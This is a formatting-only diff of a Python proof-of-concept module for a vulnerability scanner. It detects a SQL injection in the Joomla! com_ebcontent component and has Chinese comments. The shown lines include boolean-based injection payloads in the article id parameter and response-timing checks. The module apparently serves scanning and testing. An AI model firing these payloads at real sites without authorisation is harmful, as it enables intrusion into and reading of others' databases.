@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Joomla_0022' # 平台漏洞编号，留空
+    vuln_id = 'Joomla_0022'  # 平台漏洞编号，留空
     name = 'Joomla! SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         Joomla! /index.php 存在多处SQL漏洞。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'Joomla!'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'be49cd2a-0888-4fc0-bc74-9907f90a7d4c'
@@ -31,8 +33,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            hh =hackhttp.hackhttp()
+
+            hh = hackhttp.hackhttp()
             payload0 = '/index.php?option=com_ebcontent&view=article&tmpl=component&id=37&cid=20&print=1&Itemid=14&lang=vn'
             payload1 = '/index.php?option=com_ebcontent&view=article&tmpl=component&id=37%27%20AND%207599=7599%20AND%20%27gefD%27=%27gefD&cid=20&print=1&Itemid=14&lang=vn'
             payload2 = '/index.php?option=com_ebcontent&view=article&tmpl=component&id=37%27%20AND%207599=7299%20AND%20%27gefD%27=%27gefD&cid=20&print=1&Itemid=14&lang=vn'
@@ -42,7 +44,7 @@ class Poc(ABPoc):
             url2 = self.target + payload2
             url3 = self.target + payload3
             first_start_time = time.time()
-            code0, head0, body0, _, _  = hh.http(url0)
+            code0, head0, body0, _, _ = hh.http(url0)
             first_end_time = time.time()
             T1 = first_end_time - first_start_time
 
@@ -62,12 +64,12 @@ class Poc(ABPoc):
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
-                    
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
